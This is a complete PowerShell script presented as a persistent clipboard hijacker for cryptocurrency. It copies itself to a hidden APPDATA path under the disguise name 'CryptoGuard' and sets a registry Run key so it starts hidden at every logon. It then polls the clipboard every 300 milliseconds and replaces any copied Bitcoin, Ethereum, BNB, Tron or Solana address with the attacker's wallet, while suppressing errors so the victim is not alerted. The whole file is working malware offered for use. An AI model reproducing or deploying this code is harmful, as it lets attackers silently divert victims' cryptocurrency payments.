# payload.ps1 - Persistent Clipboard Hijacker for Cryptocurrency Addresses
# This script runs silently in the background, installs persistence,
# and replaces any copied crypto address with your own.

param(
    [string[]]$wallets
)

# ============================================================
# CONFIGURATION - Your wallet addresses are passed from the main HTML
# ============================================================
# $wallets[0] = BTC
# $wallets[1] = ETH
# $wallets[2] = BNB
# $wallets[3] = TRX
# $wallets[4] = SOL

$walletMap = @{
    "BTC" = $wallets[0]
    "ETH" = $wallets[1]
    "BNB" = $wallets[2]
    "TRX" = $wallets[3]
    "SOL" = $wallets[4]
}

# ============================================================
# PERSISTENCE - Ensures the script runs at every startup
# ============================================================
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptPath = "$env:APPDATA\Microsoft\Windows\CryptoGuard.ps1"

# Copy this script to a hidden location
Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force

# Add to registry for auto-start
Set-ItemProperty -Path $regPath -Name "CryptoGuard" -Value "powershell -WindowStyle Hidden -File `"$scriptPath`""

# ============================================================
# REGEX PATTERNS for detecting crypto addresses
# ============================================================
$patterns = @{
    "BTC" = '^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$'
    "ETH" = '^0x[a-fA-F0-9]{40}$'
    "BNB" = '^0x[a-fA-F0-9]{40}$'   # Same as ETH
    "TRX" = '^T[A-Za-z1-9]{33}$'
    "SOL" = '^[1-9A-HJ-NP-Za-km-z]{32,44}$'
}

# ============================================================
# FUNCTION: Get-Clipboard (PowerShell 5.0+)
# If using older PowerShell, fallback to .NET
# ============================================================
function Get-ClipboardText {
    try {
        return Get-Clipboard -Raw -ErrorAction Stop
    } catch {
        # Fallback for older systems
        Add-Type -AssemblyName System.Windows.Forms
        return [System.Windows.Forms.Clipboard]::GetText()
    }
}

function Set-ClipboardText {
    param([string]$text)
    try {
        Set-Clipboard -Value $text -ErrorAction Stop
    } catch {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Clipboard]::SetText($text)
    }
}

# ============================================================
# MAIN LOOP - Runs every 300ms, checks clipboard for addresses
# ============================================================
while ($true) {
    Start-Sleep -Milliseconds 300
    
    try {
        # Get current clipboard content
        $copiedText = Get-ClipboardText
        if ([string]::IsNullOrWhiteSpace($copiedText)) { continue }
        
        # Check against each pattern
        foreach ($currency in $patterns.Keys) {
            if ($copiedText -match $patterns[$currency]) {
                # Replace with our wallet address for that currency
                Set-ClipboardText -text $walletMap[$currency]
                break
            }
        }
    } catch {
        # Silently ignore errors (no popups to alert the user)
    }
}
